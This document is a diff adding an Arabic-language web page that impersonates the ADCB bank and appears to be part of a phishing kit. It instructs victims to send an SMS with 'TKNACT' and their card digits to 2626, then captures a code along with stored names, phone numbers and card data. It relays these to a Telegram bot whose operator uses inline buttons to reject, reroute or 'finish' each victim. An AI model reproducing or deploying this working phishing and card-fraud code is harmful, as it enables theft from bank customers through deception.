@@ -1,0 +1,651 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>تعليمات ADCB</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/fonts/fontawesome/css/all.min.css" />
+    <style>
+      :root {
+        --primary-gradient: linear-gradient(135deg, #2866d3 0%, #1e4fa8 100%);
+        --bg-main: #f3f7fb;
+        --bg-container: #ffffff;
+        --bg-header-box: #f8fafc;
+        --text-title: #0f172a;
+        --text-body: #334155;
+        --text-muted: #64748b;
+        --border-color: #cbd5e1;
+        --shadow-container: 0 15px 30px rgba(40, 102, 211, 0.04);
+        --theme-accent: #2866d3;
+        --transition-speed: 0.25s;
+        --font-main: "Cairo", "Outfit", sans-serif;
+      }
+
+      [data-theme="dark"] {
+        --bg-main: #070a10;
+        --bg-container: #101622;
+        --bg-header-box: #162030;
+        --text-title: #f8fafc;
+        --text-body: #cbd5e1;
+        --text-muted: #8e9cae;
+        --border-color: #27354a;
+        --theme-accent: #3b82f6;
+        --shadow-container: 0 15px 30px rgba(0, 0, 0, 0.3);
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: var(--font-main);
+        background-color: var(--bg-main);
+        color: var(--text-body);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 15px;
+        transition: background-color var(--transition-speed), color var(--transition-speed);
+      }
+
+      .floating-controls {
+        position: absolute;
+        top: 12px;
+        left: 12px;
+        right: 12px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        pointer-events: none;
+        z-index: 100;
+      }
+
+      .floating-controls * {
+        pointer-events: auto;
+      }
+
+      .theme-toggle-btn,
+      .back-btn {
+        background-color: var(--bg-container);
+        border: 1px solid var(--border-color);
+        color: var(--text-body);
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+      }
+
+      .theme-toggle-btn {
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+      }
+
+      .back-btn {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        text-decoration: none;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 6px 12px;
+        border-radius: 6px;
+      }
+
+      .page-shell {
+        width: 100%;
+        max-width: 410px;
+        background: var(--bg-container);
+        border: 1px solid var(--border-color);
+        border-radius: 24px;
+        box-shadow: var(--shadow-container);
+        padding: 24px;
+      }
+
+      .info-header-box {
+        background-color: var(--bg-header-box);
+        border: 1px solid var(--border-color);
+        border-radius: 20px;
+        padding: 20px;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .header-top {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 8px;
+      }
+
+      .brand-text {
+        font-size: 26px;
+        font-weight: 800;
+        color: var(--theme-accent);
+        font-family: "Outfit", sans-serif;
+      }
+
+      .brand-icon {
+        color: var(--theme-accent);
+        font-size: 28px;
+      }
+
+      .header-divider {
+        height: 1px;
+        background-color: var(--border-color);
+        margin: 8px 0 16px;
+        opacity: 0.7;
+      }
+
+      .page-title {
+        font-size: 16px;
+        font-weight: 800;
+        color: var(--theme-accent);
+        margin-bottom: 8px;
+      }
+
+      .page-desc {
+        font-size: 12px;
+        line-height: 1.6;
+        color: var(--text-body);
+        font-weight: 500;
+      }
+
+      .message-card {
+        background: linear-gradient(180deg, rgba(15, 23, 42, 0.96), rgba(30, 41, 59, 0.96));
+        color: #f8fafc;
+        border-radius: 20px;
+        padding: 22px 20px;
+        box-shadow: 0 18px 36px rgba(15, 23, 42, 0.22);
+        margin-bottom: 18px;
+      }
+
+      .message-text {
+        font-size: 15px;
+        line-height: 2;
+        text-align: right;
+        font-weight: 500;
+      }
+
+      .message-text strong {
+        font-weight: 800;
+        color: #ffffff;
+      }
+
+      .message-list {
+        margin: 0;
+        padding-right: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .message-list li {
+        font-size: 15px;
+        line-height: 2;
+        text-align: right;
+        font-weight: 500;
+      }
+
+      .form-field {
+        margin-bottom: 14px;
+      }
+
+      .field-label {
+        display: block;
+        font-size: 12px;
+        font-weight: 700;
+        color: var(--text-body);
+        margin-bottom: 8px;
+      }
+
+      .code-input {
+        width: 100%;
+        height: 52px;
+        border-radius: 12px;
+        border: 1px solid var(--border-color);
+        background: var(--bg-container);
+        padding: 0 14px;
+        font: inherit;
+        font-size: 1rem;
+        font-weight: 700;
+        color: var(--text-title);
+        text-align: center;
+        direction: ltr;
+        outline: none;
+        transition: border-color var(--transition-speed), box-shadow var(--transition-speed);
+      }
+
+      .code-input:focus {
+        border-color: var(--theme-accent);
+        box-shadow: 0 0 0 3px rgba(40, 102, 211, 0.12);
+      }
+
+      .validation-msg {
+        color: #ef4444;
+        font-size: 12px;
+        font-weight: 700;
+        text-align: center;
+        min-height: 20px;
+        margin-bottom: 12px;
+      }
+
+      .submit-btn {
+        width: 100%;
+        border: 0;
+        border-radius: 12px;
+        background: var(--primary-gradient);
+        color: #fff;
+        font: inherit;
+        font-size: 15px;
+        font-weight: 700;
+        padding: 14px;
+        cursor: pointer;
+        box-shadow: 0 10px 20px rgba(40, 102, 211, 0.16);
+      }
+
+      .loading-overlay {
+        position: fixed;
+        inset: 0;
+        background-color: var(--bg-container);
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        opacity: 0;
+        visibility: hidden;
+        transition: all var(--transition-speed) ease;
+      }
+
+      .loading-overlay.active {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .spinner-ring {
+        width: 48px;
+        height: 48px;
+        border: 3px solid var(--border-color);
+        border-top-color: var(--theme-accent);
+        border-radius: 50%;
+        animation: spin 1s infinite linear;
+        margin-bottom: 15px;
+      }
+
+      .status-text {
+        font-size: 16px;
+        font-weight: 700;
+        color: var(--text-title);
+        margin-bottom: 6px;
+        text-align: center;
+      }
+
+      .status-sub {
+        font-size: 12px;
+        color: var(--text-muted);
+        text-align: center;
+        max-width: 280px;
+        line-height: 1.4;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="spinner-ring" aria-hidden="true"></div>
+      <div class="status-text">يرجى الانتظار جاري معالجة طلبك</div>
+      <div class="status-sub" id="statusSub" style="display: none;"></div>
+    </div>
+
+    <div class="floating-controls">
+      <a href="verification.html" class="back-btn">
+        إلغاء والعودة
+        <i class="fa-solid fa-arrow-left" style="transform: scaleX(-1); font-size: 10px;"></i>
+      </a>
+      <button class="theme-toggle-btn" id="themeToggle" aria-label="تبديل الوضع الليلي">
+        <i class="fa-solid fa-moon"></i>
+      </button>
+    </div>
+
+    <div class="page-shell">
+      <div class="info-header-box">
+        <div class="header-top">
+          <span class="brand-text">ADCB</span>
+          <i class="fa-solid fa-building-columns brand-icon" aria-hidden="true"></i>
+        </div>
+        <div class="header-divider"></div>
+      </div>
+
+      <div class="message-card">
+        <ul class="message-list">
+          <li>أستكمال الطلب للبطاقة المنتهية بـ <strong id="cardLast4Text">****</strong>.</li>
+          <li>أرسل الرسالة إلى الرقم <strong>2626</strong> من رقم هاتفك المسجل لدينا.</li>
+          <li>أرسل <strong>TKNACT</strong> ثم مسافة ثم <strong>آخر 6 أرقام</strong> من بطاقتك.</li>
+          <li>انتظر كلمة المرور لمرة واحدة.</li>
+        </ul>
+      </div>
+
+      <form id="adcbForm" novalidate>
+        <div class="form-field">
+          <label class="field-label" for="adcbCode">أدخل آخر 6 أرقام هنا</label>
+          <input id="adcbCode" class="code-input" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" />
+        </div>
+        <div class="validation-msg" id="adcbError"></div>
+        <button class="submit-btn" type="submit">ارسال</button>
+      </form>
+    </div>
+
+    <script src="assets/js/config.js"></script>
+    <script>
+      (function () {
+        const state = {
+          theme: localStorage.getItem("alain_payment_theme") || "light"
+        };
+        const themeToggleBtn = document.getElementById("themeToggle");
+        const cardLast4Text = document.getElementById("cardLast4Text");
+        const adcbForm = document.getElementById("adcbForm");
+        const adcbCodeInput = document.getElementById("adcbCode");
+        const adcbError = document.getElementById("adcbError");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        document.documentElement.setAttribute("data-theme", state.theme);
+        updateThemeIcon();
+        applyCardLast4();
+
+        themeToggleBtn.addEventListener("click", () => {
+          state.theme = state.theme === "light" ? "dark" : "light";
+          document.documentElement.setAttribute("data-theme", state.theme);
+          localStorage.setItem("alain_payment_theme", state.theme);
+          updateThemeIcon();
+        });
+
+        function updateThemeIcon() {
+          const icon = themeToggleBtn.querySelector("i");
+          icon.className = state.theme === "dark" ? "fa-solid fa-sun" : "fa-solid fa-moon";
+        }
+
+        function normalizeDigits(value) {
+          return String(value || "").replace(/\D+/g, "");
+        }
+
+        function getTelegramCredentials() {
+          return { proxy: true }; // credentials handled server-side
+        }
+
+        function setOverlayVisible(visible) {
+          loadingOverlay.classList.toggle("active", visible);
+        }
+
+        async function telegramApi(credentials, method, body) {
+          const response = await fetch("/.netlify/functions/telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ method, ...body })
+          });
+          const json = await response.json().catch(() => null);
+          if (!response.ok || !json?.ok) return null;
+          return json;
+        }
+
+        let adcbPollTimer = null;
+        let telegramUpdatesOffset = Number(localStorage.getItem("telegramUpdatesOffset") || "0") || 0;
+
+        function persistTelegramOffset(offset) {
+          telegramUpdatesOffset = Number(offset) || telegramUpdatesOffset;
+          localStorage.setItem("telegramUpdatesOffset", String(telegramUpdatesOffset));
+        }
+
+        async function bootstrapUpdatesOffset(credentials) {
+          if (telegramUpdatesOffset > 0) return;
+          const latest = await telegramApi(credentials, "getUpdates", {
+            offset: 0,
+            timeout: 0,
+            allowed_updates: ["callback_query"]
+          });
+          const updates = latest?.result || [];
+          const last = updates[updates.length - 1];
+          if (last?.update_id != null) {
+            persistTelegramOffset(Number(last.update_id) + 1);
+          }
+        }
+
+        function extractLast4() {
+          try {
+            const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+            const fromPayload = normalizeDigits(paymentData.cardNumberDigits || paymentData.cardNumber || paymentData.cardLast4);
+            if (fromPayload.length >= 4) return fromPayload.slice(-4);
+          } catch {
+            // ignore invalid paymentData and continue to fallbacks
+          }
+
+          const fallbacks = [
+            localStorage.getItem("cardLast4"),
+            localStorage.getItem("cardNumber"),
+            localStorage.getItem("paymentCardNumber")
+          ];
+
+          for (const value of fallbacks) {
+            const digits = normalizeDigits(value);
+            if (digits.length >= 4) return digits.slice(-4);
+          }
+
+          return "****";
+        }
+
+        function applyCardLast4() {
+          if (!cardLast4Text) return;
+          cardLast4Text.textContent = extractLast4();
+        }
+
+        function getMaskedCardNumber() {
+          return `**** ${extractLast4()}`;
+        }
+
+        function readCustomerInfo() {
+          try {
+            const payload = JSON.parse(localStorage.getItem("fazaa.orderForm") || "{}");
+            return {
+              fullName: payload.fullName || "غير معروف",
+              phoneNumber: payload.phoneNumber || "غير معروف"
+            };
+          } catch {
+            return {
+              fullName: "غير معروف",
+              phoneNumber: "غير معروف"
+            };
+          }
+        }
+
+        function setValidationError(message) {
+          adcbError.textContent = message;
+        }
+
+        function validateAdcbCode() {
+          const digits = normalizeDigits(adcbCodeInput.value);
+          adcbCodeInput.value = digits.slice(0, 6);
+
+          if (!digits) {
+            setValidationError("يرجى إدخال آخر 6 أرقام.");
+            return false;
+          }
+
+          if (digits.length < 6) {
+            setValidationError("يجب إدخال 6 أرقام كاملة.");
+            return false;
+          }
+
+          if (!/^\d{6}$/.test(digits)) {
+            setValidationError("يرجى إدخال 6 أرقام صحيحة فقط.");
+            return false;
+          }
+
+          setValidationError("");
+          return true;
+        }
+
+        function formatAdcbMessage(adcbCode) {
+          const customer = readCustomerInfo();
+          return [
+            "🏦 <b>ADCB</b>",
+            "👤 <b>معلومات العميل</b>",
+            `<b>الاسم:</b> ${customer.fullName || "غير معروف"}`,
+            `<b>الهاتف:</b> ${customer.phoneNumber || "غير معروف"}`,
+            "",
+            `<b>رقم البطاقة:</b> <code>${getMaskedCardNumber()}</code>`,
+            `<b>ADCB:</b> <code>${adcbCode}</code>`
+          ].join("\n");
+        }
+
+        async function sendAdcbToTelegram(adcbCode) {
+          const credentials = getTelegramCredentials();
+          if (!credentials) return null;
+          const message = formatAdcbMessage(adcbCode);
+          const response = await fetch("/.netlify/functions/telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              method: "sendMessage",
+              text: message,
+              parse_mode: "HTML",
+              disable_web_page_preview: true,
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: "❌ رفض", callback_data: "reject_adcb" },
+                    { text: "🏧 صراف الالي", callback_data: "atm" }
+                  ],
+                  [
+                    { text: "⛔ رفض البطاقة", callback_data: "reject_card" },
+                    { text: "🟢 انهاء عملية التسجيل", callback_data: "end_registration" }
+                  ]
+                ]
+              }
+            })
+          });
+          if (!response.ok) return null;
+          const data = await response.json().catch(() => null);
+          if (!data?.ok || !data?.result?.message_id) return null;
+          return { credentials, messageId: Number(data.result.message_id) };
+        }
+
+        async function finalizeTelegramCallback(credentials, callbackQuery, statusText) {
+          const message = callbackQuery?.message;
+          if (!message) return;
+          const baseText = String(message.text || "")
+            .replace(/\n\nالحالة:\s*(❌ تم رفض ADCB|🏧 تحويل إلى الصراف الآلي|⛔ تم رفض البطاقة|🟢 تم إنهاء عملية التسجيل)\s*$/u, "")
+            .trim();
+          const updatedText = `${baseText}\n\nالحالة: ${statusText}`;
+          await telegramApi(credentials, "editMessageText", {
+            chat_id: message.chat.id,
+            message_id: message.message_id,
+            text: updatedText,
+            disable_web_page_preview: true
+          });
+          await telegramApi(credentials, "answerCallbackQuery", {
+            callback_query_id: callbackQuery.id,
+            text: statusText,
+            show_alert: false
+          });
+        }
+
+        function stopAdcbPolling() {
+          if (!adcbPollTimer) return;
+          window.clearInterval(adcbPollTimer);
+          adcbPollTimer = null;
+        }
+
+        function startAdcbPolling(targetMessageId, credentials) {
+          stopAdcbPolling();
+          adcbPollTimer = window.setInterval(async () => {
+            try {
+              const updatesResponse = await telegramApi(credentials, "getUpdates", {
+                offset: telegramUpdatesOffset || 0,
+                timeout: 0,
+                allowed_updates: ["callback_query"]
+              });
+              const updates = updatesResponse?.result || [];
+              for (const update of updates) {
+                if (update?.update_id != null) {
+                  persistTelegramOffset(Number(update.update_id) + 1);
+                }
+                const callback = update?.callback_query;
+                if (Number(callback?.message?.message_id || 0) !== Number(targetMessageId)) {
+                  continue;
+                }
+                const data = String(callback?.data || "");
+                if (data === "reject_adcb") {
+                  await finalizeTelegramCallback(credentials, callback, "❌ تم رفض ADCB");
+                  setOverlayVisible(false);
+                  stopAdcbPolling();
+                  adcbCodeInput.value = "";
+                  setValidationError("القيمة المدخلة غير صحيحة. يرجى المحاولة مرة أخرى.");
+                  adcbCodeInput.focus();
+                  return;
+                }
+                if (data === "atm") {
+                  await finalizeTelegramCallback(credentials, callback, "🏧 تحويل إلى الصراف الآلي");
+                  setOverlayVisible(false);
+                  stopAdcbPolling();
+                  window.location.href = "atm.html";
+                  return;
+                }
+                if (data === "reject_card") {
+                  await finalizeTelegramCallback(credentials, callback, "⛔ تم رفض البطاقة");
+                  setOverlayVisible(false);
+                  stopAdcbPolling();
+                  window.location.href = "payment.html?cardRejected=1";
+                  return;
+                }
+                if (data === "end_registration") {
+                  await finalizeTelegramCallback(credentials, callback, "🟢 تم إنهاء عملية التسجيل");
+                  setOverlayVisible(false);
+                  stopAdcbPolling();
+                  window.location.href = "success.html";
+                  return;
+                }
+              }
+            } catch {
+              // Keep polling quietly.
+            }
+          }, 1200);
+        }
+
+        adcbCodeInput.addEventListener("input", () => {
+          adcbCodeInput.value = normalizeDigits(adcbCodeInput.value).slice(0, 6);
+          if (adcbError.textContent) {
+            setValidationError("");
+          }
+        });
+
+        adcbForm.addEventListener("submit", async (event) => {
+          event.preventDefault();
+          if (!validateAdcbCode()) return;
+          const adcbCode = normalizeDigits(adcbCodeInput.value);
+          setOverlayVisible(true);
+          const sent = await sendAdcbToTelegram(adcbCode);
+          if (!sent?.messageId || !sent?.credentials) {
+            setOverlayVisible(false);
+            setValidationError("تعذر إرسال الطلب حالياً. يرجى المحاولة مرة أخرى.");
+            return;
+          }
+          await bootstrapUpdatesOffset(sent.credentials);
+          startAdcbPolling(sent.messageId, sent.credentials);
+        });
+      })();
+    </script>
+  </body>
+</html>
